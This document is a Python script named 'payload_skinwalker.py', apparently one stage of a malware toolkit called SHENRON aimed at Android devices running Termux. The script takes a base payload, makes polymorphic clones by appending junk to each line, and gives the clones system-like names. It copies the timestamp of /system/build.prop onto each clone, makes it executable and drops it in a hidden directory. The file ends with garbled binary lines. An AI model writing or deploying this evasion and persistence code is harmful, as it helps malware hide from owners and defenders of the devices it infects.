#!/usr/bin/env python3
# payload_skinwalker.py - SHENRON Layer 2: Morphing Clone Generator

import os
import time
import random
import shutil
import string
from datetime import datetime
from pathlib import Path

def junk_insert(line):
    # Insert junk code or random whitespace
    junk = [
        " # noop",
        " ; true",
        " && echo ''",
        " ",
        "\t",
        ""
    ]
    return line + random.choice(junk)

def mutate_code(base_code):
    lines = base_code.splitlines()
    mutated = [junk_insert(line) for line in lines]
    return "\n".join(mutated)

def spoof_timestamp(target_file, ref_file="/system/build.prop"):
    try:
        stat = os.stat(ref_file)
        os.utime(target_file, (stat.st_atime, stat.st_mtime))
        print(f"[âœ“] Timestamp spoofed to match {ref_file}")
    except Exception as e:
        print(f"[!] Timestamp spoofing failed: {e}")

def generate_filename():
    system_like = [
        "svcmanager.sh", "netd_sync", "dalvik_stub", "vold_patch.sh",
        "cron.daily.sh", "update-preload", "logpersistd.sh"
    ]
    return random.choice(system_like)

def morph_into_variants(base_path):
    print("[*] Generating polymorphic clones...")
    with open(base_path, "r") as f:
        base_code = f.read()

    output_dir = "/data/data/com.termux/files/usr/var/.shenron/morphs"
    os.makedirs(output_dir, exist_ok=True)

    for i in range(3):
        mutated = mutate_code(base_code)
        filename = generate_filename()
        out_path = os.path.join(output_dir, filename)
        with open(out_path, "w") as f:
            f.write(mutated)
        spoof_timestamp(out_path)
        os.chmod(out_path, 0o755)
        print(f"[+] Morph dropped: {out_path}")

if __name__ == "__main__":
    base_script = "/data/data/com.termux/files/usr/var/.shenron/deadzone_payload.py"
    if Path(base_script).exists():
        morph_into_variants(base_script)
    else:
        print("[!] Base payload not found. Ensure Deadzone ran successfully.")

b˜solê³Bˆ5ûÅ`6yr =v¼£JÔú‚ÏDÖŠoI#MORPHED

óøc¸ËÖ ¸O¥Ç%Fu—òEfâP#MORPHED

‘cİ‚6ÆÁi·I’°‡Á§ğŠª{pÕû«7Ã@,ö¶c6#MORPHED
